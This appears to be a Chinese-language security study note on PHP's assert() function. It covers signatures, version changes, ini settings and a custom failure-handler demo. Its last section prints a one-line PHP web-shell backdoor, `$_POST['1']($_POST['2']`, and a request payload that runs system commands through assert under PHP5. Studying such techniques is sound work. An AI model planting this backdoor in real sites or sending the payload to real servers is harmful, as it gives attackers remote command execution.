# assert

**参考：**

- https://www.anquanke.com/post/id/173201#h2-1

**函数构造：**

```php
PHP5：
assert ( mixed $assertion [, string $description ] ) : bool
    
PHP7：
assert ( mixed $assertion [, Throwable $exception ] ) : bool
```



**更新日志：**

- PHP >= 5.4.8，description 可作为第四个参数提供给 ASSERT_CALLBACK 模式里的回调函数
- 在 PHP 5 中，参数 assertion 必须是可执行的字符串，或者运行结果为布尔值的表达式
- 在 PHP 7 中，参数 assertion 可以是任意表达式，并用其运算结果作为断言的依据
- 在 PHP 7 中，参数 exception 可以是个 [Throwable](https://www.php.net/manual/en/class.throwable.php) 对象，用于捕获表达式运行错误或断言结果为失败。(当然 [assert.exception](https://www.php.net/manual/zh/info.configuration.php#ini.assert.exception) 需开启)
- PHP >= 7.0.0，支持 `zend.assertions`、`assert.exception` 相关配置及其特性
- PHP >= 7.2 版本开始，参数 assertion 不再支持字符串



PHP7增加了断言的Expectations，提供了灵活的调试策略。另外提供了两组php.ini的配置。

| Directive                                                    | Default value | Possible values                                              |
| :----------------------------------------------------------- | :------------ | :----------------------------------------------------------- |
| [zend.assertions](https://www.php.net/manual/zh/ini.core.php#ini.zend.assertions) | *1*           | *1*: generate and execute code (development mode) *0*: generate code but jump around it at runtime               *-1*: do not generate code (production mode) |
| [assert.exception](https://www.php.net/manual/zh/info.configuration.php#ini.assert.exception) | *0*           | *1*: throw when the assertion fails, either by throwing the object provided as the `exception` or by throwing a new **AssertionError** object if `exception` wasn't provided                                              *0*: use or generate a **Throwable** as described above, but only generate a warning based on that object rather than throwing it (compatible with PHP 5 behaviour) |



## 自定义断言异常处理函数

**测试代码**

```php
<?php
// 激活断言，并设置它为 quiet
assert_options(ASSERT_ACTIVE, 1);
assert_options(ASSERT_WARNING, 0);
assert_options(ASSERT_QUIET_EVAL, 1);

//创建处理函数
function my_assert_handler($file, $line, $code)
{
    echo "<hr>Assertion Failed:
        File '$file'<br />
        Line '$line'<br />
        Code '$code'<br /><hr />";
}

// 设置回调函数
assert_options(ASSERT_CALLBACK, 'my_assert_handler');

// 让一则断言失败
$asse=2<1;
assert($asse);
?>
```

考虑到PHP7.2弃用将一个字符串参数当作assert()的参数。

![](/images/19-7-22_PHP_assert_自定义断言异常处理函数_1.png)

上述代码运行结果如下：

```txt
<hr>Assertion Failed:
        File 'C:\Users\j7ur8\Desktop\test2.php'<br />
        Line '21'<br />
        Code ''<br /><hr />
```

## 可变函数后门

**测试代码**

```php
<?php
$_POST['1']($_POST['2']
```

PHP5可传入`1=assert&2=system('ls')`来执行命令。PHP7中assert变成了一种语言结构，而不是一个函数。

> 可变函数不能用于例如 [echo](http://php.net/manual/zh/function.echo.php)，[print](http://php.net/manual/zh/function.print.php)，[unset()](http://php.net/manual/zh/function.unset.php)，[isset()](http://php.net/manual/zh/function.isset.php)，[empty()](http://php.net/manual/zh/function.empty.php)，[include](http://php.net/manual/zh/function.include.php)，[require](http://php.net/manual/zh/function.require.php) 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。

